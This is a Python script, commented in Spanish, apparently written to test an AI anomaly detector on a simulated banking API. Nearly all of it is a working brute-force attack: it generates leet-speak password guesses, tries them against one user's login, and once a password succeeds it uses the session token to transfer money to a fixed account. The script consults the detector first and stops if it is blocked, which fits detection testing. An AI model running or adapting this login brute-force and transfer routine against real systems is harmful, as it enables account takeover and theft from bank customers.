"""
Módulo de Simulación de Prueba de Estrés / Bot de Evaluación para la API
-------------------------------------------------------------------------
Descripción: Realiza pruebas de autenticación heurística para cliente_001
             y valida la detección de anomalías en tiempo real con la IA (BGG).
VERSIÓN:     1.2 (Unicliente con integración BGG)
=========================================================================
"""

import requests
import time

# ==========================================
# CONFIGURACIÓN DE ENDPOINTS Y RED
# ==========================================
API_BASE = "https://statue-essential-dirtiness.ngrok-free.dev"

LOGIN_URL = f"{API_BASE}/api/v1/auth/login"
TRANSFER_URL = f"{API_BASE}/api/v1/transactions/transfer"
PREDICT_URL = f"{API_BASE}/api/v1/predict"  # Endpoint del Motor BGG (FastAPI)

# Usuario objetivo para la prueba
TARGET_USER = "cliente_001"

HEADERS = {
    "Content-Type": "application/json",
    "ngrok-skip-browser-warning": "true"
}

# ==========================================
# DICCIONARIO Y PATRONES HEURÍSTICOS
# ==========================================
KNOWN_CREDENTIALS = {}

CONTEXT_KEYWORDS = ["Banco", "Secure"]
YEARS = ["2024", "2026"]
SYMBOLS = ["$", "#"]

def generate_passwords() -> list[str]:
    """
    Genera combinaciones candidatas de contraseñas basándose en palabras clave,
    reemplazos leet-speak y sufijos habituales.
    """
    generated = set()
    for base in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                leet = base.replace('e', '3').replace('s', '$')
                generated.add(f"{base}{yr}")
                generated.add(f"{leet}{sym}{yr}")
                generated.add(f"Banco$ecure#{yr}")
    return list(generated)

def run_api_bot():
    print(f"🤖 [BOT API] Iniciando verificación para usuario: {TARGET_USER}\n")

    candidates = generate_passwords()

    for attempt, pwd in enumerate(candidates, 1):
        # 1. TELEMETRÍA DE BOT: Velocidad de tecleo y latencia en rango anómalo
        telemetria_payload = {
            "status_code": 401,
            "latency": 15.0,      # 15 ms (respuesta muy rápida de script)
            "user_speed": 0.01    # 0.01 seg entre teclas (inhumano)
        }

        # 2. Consultar PRIMERO al motor BGG de la IA
        try:
            ia_resp = requests.post(PREDICT_URL, json=telemetria_payload, headers=HEADERS, timeout=5)
            if ia_resp.status_code == 200:
                data_ia = ia_resp.json()
                if data_ia.get("bloquear") is True or data_ia.get("codigo_http") == 403:
                    print(f"⛔ [INTENTO {attempt}] ¡BOT BLOQUEADO POR LA IA (BGG)! Access Denied.")
                    print(f"🛡️ Motivo: {data_ia.get('mensaje')} (Score: {data_ia.get('anomaly_score'):.4f})")
                    print("🛑 Abortando ataque de fuerza bruta por detección de anomalía.")
                    return  # Interrumpe el ataque de inmediato
        except Exception as e:
            print(f"⚠️ No se pudo consultar a la API de IA: {e}")

        # 3. Intentar Login en el Simulador Bancario
        login_payload = {"username": TARGET_USER, "password": pwd}
        try:
            response = requests.post(LOGIN_URL, json=login_payload, headers=HEADERS, timeout=5)
            
            if response.status_code == 200:
                print(f"✅ [Intento {attempt}] ¡Contraseña identificada!: '{pwd}'")
                KNOWN_CREDENTIALS[TARGET_USER] = pwd
                execute_login_and_transfer(TARGET_USER, pwd, response.json())
                return
            else:
                print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> '{pwd}'")
        
        except Exception as e:
            print(f"⚠️ Error de conexión en login: {e}")

        # Pausa mínima de bot (0.05 segundos)
        time.sleep(0.05)

    print("\n❌ Finalizado: Ninguna contraseña logró autenticarse.")

def execute_login_and_transfer(username, password, login_data=None):
    if not login_data:
        resp = requests.post(LOGIN_URL, json={"username": username, "password": password}, headers=HEADERS)
        login_data = resp.json()

    headers_tx = HEADERS.copy()
    token = login_data.get("token") or login_data.get("access_token")
    if token:
        headers_tx["Authorization"] = f"Bearer {token}"

    source_account = login_data.get("account_id", "MX-4821-0001")
    transfer_payload = {
        "account_id": source_account,
        "destination_account": "MX-9012-3344",
        "amount": 1500.00
    }

    print(f"💸 Ejecutando transferencia con sesión validada: {transfer_payload}")
    try:
        tx_resp = requests.post(TRANSFER_URL, json=transfer_payload, headers=headers_tx, timeout=5)
        print(f"📊 Respuesta Transferencia: HTTP {tx_resp.status_code}\n")
    except Exception as e:
        print(f"⚠️ Error ejecutando transferencia: {e}\n")

if __name__ == "__main__":
    run_api_bot()